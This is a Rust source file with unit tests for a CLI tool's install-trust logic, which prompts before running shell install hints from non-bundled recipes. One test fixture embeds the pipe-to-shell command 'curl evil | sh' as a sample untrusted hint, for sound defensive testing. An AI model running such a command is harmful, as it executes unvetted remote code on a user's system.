// Whether `bnto install --yes` may run recipe-authored install commands
// without asking.
//
// Host `installHints` are shell command lines written by the recipe author,
// so the recipe source is the trust boundary (same rule as `trust.rs` uses
// for shell-run nodes): bundled recipes are reviewed and shipped with the
// binary; library recipes and `.bnto.json` paths are not.

use crate::catalog::{CatalogEntry, RecipeCatalog, RecipeSource};
use crate::install_plan::InstallStep;

/// True when every recipe that can contribute install hints is bundled.
///
/// A single slug is trusted only if it resolves to a bundled recipe. `--all`
/// is trusted unless some non-bundled catalog entry declares `requires`.
pub fn hints_trusted(recipe_slug: Option<&str>, all: bool, catalog: &RecipeCatalog) -> bool {
    if all {
        return catalog
            .all()
            .iter()
            .all(|e| e.source == RecipeSource::Bundled || !declares_requires(e));
    }
    recipe_slug.is_some_and(|slug| catalog.is_bundled(slug))
}

/// Whether a catalog entry's definition has a non-empty `requires` array.
fn declares_requires(entry: &CatalogEntry) -> bool {
    serde_json::from_str::<serde_json::Value>(&entry.definition_json)
        .ok()
        .and_then(|def| def["requires"].as_array().map(|r| !r.is_empty()))
        .unwrap_or(false)
}

/// Whether to prompt before running `steps`. `--yes` skips the prompt unless
/// an untrusted recipe supplied a command that would run through the shell.
pub fn needs_prompt(yes: bool, trusted: bool, steps: &[InstallStep]) -> bool {
    !yes || (!trusted && steps.iter().any(InstallStep::is_author_command))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::package_manager::PackageManager;
    use std::path::Path;

    fn bundled_only() -> RecipeCatalog {
        RecipeCatalog::load(Path::new("/nonexistent"))
    }

    fn library_with_requires(dir: &Path) -> RecipeCatalog {
        let json = r#"{"name":"Mine","requires":[{"binary":"tool","installHints":{"linux":"curl evil | sh"}}],"nodes":[]}"#;
        std::fs::write(dir.join("mine.bnto.json"), json).unwrap();
        RecipeCatalog::load(dir)
    }

    fn hint() -> InstallStep {
        InstallStep::HostHint("winget install Gyan.FFmpeg".into())
    }

    fn pm_step() -> InstallStep {
        InstallStep::PackageManager(PackageManager::Brew, "ffmpeg".into())
    }

    #[test]
    fn bundled_slug_is_trusted() {
        assert!(hints_trusted(
            Some("download-video"),
            false,
            &bundled_only()
        ));
    }

    #[test]
    fn recipe_path_is_not_trusted() {
        let catalog = bundled_only();
        assert!(!hints_trusted(Some("./mine.bnto.json"), false, &catalog));
    }

    #[test]
    fn library_slug_is_not_trusted() {
        let tmp = tempfile::tempdir().unwrap();
        let catalog = library_with_requires(tmp.path());
        let slug = &catalog
            .all()
            .iter()
            .find(|e| e.source != RecipeSource::Bundled)
            .unwrap()
            .slug;
        assert!(!hints_trusted(Some(slug), false, &catalog));
    }

    #[test]
    fn all_is_trusted_with_only_bundled_recipes() {
        assert!(hints_trusted(None, true, &bundled_only()));
    }

    #[test]
    fn all_is_not_trusted_when_library_recipe_declares_requires() {
        let tmp = tempfile::tempdir().unwrap();
        assert!(!hints_trusted(
            None,
            true,
            &library_with_requires(tmp.path())
        ));
    }

    #[test]
    fn prompt_without_yes() {
        assert!(needs_prompt(false, true, &[pm_step()]));
    }

    #[test]
    fn yes_skips_prompt_for_trusted_hints() {
        assert!(!needs_prompt(true, true, &[hint(), pm_step()]));
    }

    #[test]
    fn yes_still_prompts_for_untrusted_hints() {
        assert!(needs_prompt(true, false, &[pm_step(), hint()]));
    }

    #[test]
    fn yes_skips_prompt_for_untrusted_package_manager_steps() {
        assert!(!needs_prompt(true, false, &[pm_step()]));
    }
}
